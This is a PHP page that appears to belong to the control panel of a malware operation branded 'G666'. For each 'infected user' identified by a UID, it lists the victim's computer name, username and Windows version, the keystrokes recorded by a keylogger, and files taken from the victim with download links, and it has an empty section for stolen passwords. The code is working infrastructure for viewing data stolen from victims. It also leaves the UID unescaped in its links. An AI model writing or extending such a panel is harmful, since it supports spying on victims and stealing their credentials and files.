<?php
// Activer l'affichage des erreurs PHP pour le débogage
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Connexion à la base de données
include "../../db.php";

// Vérifier si l'UID est présent dans l'URL
$uid = isset($_GET['uid']) ? $_GET['uid'] : null;
if (!$uid) {
    echo "<p style='color: red;'>Aucun UID fourni dans l'URL.</p>";
    exit;
}
?>

<!doctype html>
<html lang="en" class="light-style layout-menu-fixed layout-compact" dir="ltr" data-theme="theme-default" data-assets-path="../assets/" data-template="vertical-menu-template-free">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0" />
  <title>Details de l'ordinateur | G666</title>

  <link rel="stylesheet" href="../assets/vendor/fonts/boxicons.css" />
  <link rel="stylesheet" href="../assets/vendor/css/core.css" />
  <link rel="stylesheet" href="../assets/vendor/css/theme-default.css" />
  <link rel="stylesheet" href="../assets/css/demo.css" />
  <link rel="stylesheet" href="../assets/vendor/libs/perfect-scrollbar/perfect-scrollbar.css" />

  <script src="../assets/vendor/js/helpers.js"></script>
  <script src="../assets/js/config.js"></script>

  <style>
    .custom-card {
      width: 100%;
      margin-bottom: 20px;
      padding: 20px;
      border-radius: 8px;
      background-color: #f8f9fa;
      box-shadow: 0px 2px 4px rgba(0, 0, 0, 0.1);
    }

    .custom-card h5 {
      margin-bottom: 15px;
      font-size: 18px;
      font-weight: bold;
    }

    .custom-table {
      width: 100%;
      border-collapse: collapse;
    }

    .custom-table th, .custom-table td {
      border: 1px solid #ddd;
      padding: 8px;
    }

    .custom-table th {
      background-color: #f1f1f1;
      text-align: left;
      font-weight: bold;
    }

    .custom-icon {
      font-size: 20px;
      margin-right: 8px;
      vertical-align: middle;
    }
  </style>
</head>
<body>
  <!-- Layout wrapper -->
  <div class="layout-wrapper layout-content-navbar">
    <div class="layout-container">
      <!-- Menu -->
      <aside id="layout-menu" class="layout-menu menu-vertical menu bg-menu-theme">
        <div class="app-brand demo">
          <a href="index.html" class="app-brand-link">
            <span class="app-brand-logo demo">
              <!-- Logo ici -->
            </span>
            <span class="app-brand-text demo menu-text fw-bold ms-2">G666</span>
          </a>
          <a href="javascript:void(0);" class="layout-menu-toggle menu-link text-large ms-auto d-block d-xl-none">
            <i class="bx bx-chevron-left bx-sm d-flex align-items-center justify-content-center"></i>
          </a>
        </div>
        <div class="menu-inner-shadow"></div>
        <ul class="menu-inner py-1">
          <li class="menu-item">
            <a href="index.html" class="menu-link">
              <i class="menu-icon tf-icons bx bx-home-smile"></i>
              <div class="text-truncate" data-i18n="Dashboards">Dashboards</div>
            </a>
          </li>
          <li class="menu-header small text-uppercase">
            <span class="menu-header-text">Apps &amp; Pages</span>
          </li>
          <li class="menu-item">
            <a href="javascript:void(0);" class="menu-link menu-toggle">
              <i class="menu-icon tf-icons bx bx-dock-top"></i>
              <div class="text-truncate" data-i18n="Account Settings">Account Settings</div>
            </a>
          </li>
          <li class="menu-item">
            <a href="javascript:void(0);" class="menu-link menu-toggle">
              <i class="menu-icon tf-icons bx bx-lock-open-alt"></i>
              <div class="text-truncate" data-i18n="Authentications">Authentications</div>
            </a>
          </li>
          <li class="menu-header small text-uppercase">
            <span class="menu-header-text">Forms &amp; Tables</span>
          </li>
          <li class="menu-item active">
            <a href="infected-users.php" class="menu-link">
              <i class="menu-icon tf-icons bx bx-table"></i>
              <div class="text-truncate" data-i18n="Tables">Infected Users</div>
            </a>
          </li>
          <li class="menu-header small text-uppercase">
            <span class="menu-header-text">Misc</span>
          </li>
          <li class="menu-item">
            <a href="https://demos.themeselection.com/sneat-bootstrap-html-admin-template/documentation/" target="_blank" class="menu-link">
              <i class="menu-icon tf-icons bx bx-file"></i>
              <div class="text-truncate" data-i18n="Documentation">Documentation</div>
            </a>
          </li>
        </ul>
      </aside>
      <!-- /Menu -->

      <!-- Layout page -->
      <div class="layout-page">
        <div class="content-wrapper">
          <div class="container-xxl flex-grow-1 container-p-y">
            <h4 class="fw-bold py-3 mb-4">Details de l'ordinateur</h4>

            <!-- Bloc 1 : Informations générales -->
            <div class="custom-card">
              <h5><i class="bx bx-info-circle custom-icon"></i> Informations générales</h5>
              <table class="custom-table">
                <thead>
                  <tr>
                    <th>Nom de l'ordinateurs</th>
                    <th>Utilisateur</th>
                    <th>Version Windows</th>
                    <th>Architecture</th>
                  </tr>
                </thead>
                <tbody>
                  <?php
                  // Requête SQL pour récupérer les informations générales
                  $sql = "SELECT DISTINCT uid, computer_name, username, architecture, windows_version FROM client_data WHERE uid = ?";
                  $stmt = $conn->prepare($sql);
                  $stmt->bind_param("s", $uid);
                  $stmt->execute();
                  $result = $stmt->get_result();

                  // Vérifier si des résultats sont retournés
                  if ($result->num_rows > 0) {
                    while ($row = $result->fetch_assoc()) {
                      echo "<tr>";
                      echo "<td>" . htmlspecialchars($row['computer_name']) . "</td>";
                      echo "<td>" . htmlspecialchars($row['username']) . "</td>";
                      echo "<td>" . htmlspecialchars($row['windows_version']) . "</td>";
                      echo "<td>" . htmlspecialchars($row['architecture']) . "</td>";
                      echo "</tr>";
                    }
                  } else {
                    echo "<tr><td colspan='4'>Aucune donnée disponible pour cet UID.</td></tr>";
                  }
                  $stmt->close();
                  ?>
                </tbody>
              </table>
            </div>

            <!-- Bloc 2 : Info tapée -->
            <div class="custom-card">
              <h5><i class="bx bx-message-square-dots custom-icon"></i> Info tapée</h5>
              <table class="custom-table">
                <thead>
                  <tr>
                    <th>Info tapée</th>
                  </tr>
                </thead>
                <tbody>
                  <?php
                  // Requête SQL pour récupérer les informations des frappes
                  $sql = "SELECT key_stroke FROM keylog_data WHERE uid = ? ORDER BY key_stroke DESC";
                  $stmt = $conn->prepare($sql);
                  $stmt->bind_param("s", $uid);
                  $stmt->execute();
                  $result = $stmt->get_result();

                  // Vérifier si des résultats sont retournés
                  if ($result->num_rows > 0) {
                    while ($row = $result->fetch_assoc()) {
                      echo "<tr>";
                      echo "<td>" . htmlspecialchars($row['key_stroke']) . "</td>";
                      echo "</tr>";
                    }
                  } else {
                    echo "<tr><td colspan='2'>Aucune donnée disponible pour cet UID.</td></tr>";
                  }
                  $stmt->close();
                  ?>
                </tbody>
              </table>
            </div>

            <!-- Bloc 3 : Fichiers -->
            <div class="custom-card">
              <h5><i class="bx bx-folder custom-icon"></i> Fichiers</h5>
              <p>Aucune donnée disponible pour les fichiers.</p>
              <table class="custom-table">
                <thead>
                  <tr>
                    <th>Fichiers</th>
                  </tr>
                </thead>
                <tbody>
       

                  <?php
                  // Requête SQL pour récupérer les informations des frappes
                  $sql = "SELECT filename, file_type FROM upload_files WHERE uid = ?" ;
                  $stmt = $conn->prepare($sql);
                  $stmt->bind_param("s", $uid);
                  $stmt->execute();
                  $result = $stmt->get_result();

                  // Vérifier si des résultats sont retournés
                  if ($result->num_rows > 0) {
                    while ($row = $result->fetch_assoc()) {
                      echo "<tr>";
                      echo "<td><a href='". "../../" . $uid . "/". htmlspecialchars($row['filename'])  . "'>" . htmlspecialchars($row['filename']) . "</a></td>";
                      echo "</tr>";
                    }
                  } else {
                    echo "<tr><td colspan='2'>Aucune donnée disponible pour cet UID.</td></tr>";
                  }
                  $stmt->close();
                  ?>
                </tbody>
              </table>
            </div>

            <!-- Bloc 4 : Mots de passe -->
            <div class="custom-card">
              <h5><i class="bx bx-lock custom-icon"></i> Mots de passe</h5>
              <p>Aucune donnée disponible pour les mots de passe.</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <script src="../assets/vendor/libs/jquery/jquery.js"></script>
  <script src="../assets/vendor/js/bootstrap.js"></script>
  <script src="../assets/vendor/libs/perfect-scrollbar/perfect-scrollbar.js"></script>
</body>
</html>

<?php
// Fermer la connexion à la base de données
$conn->close();
?>
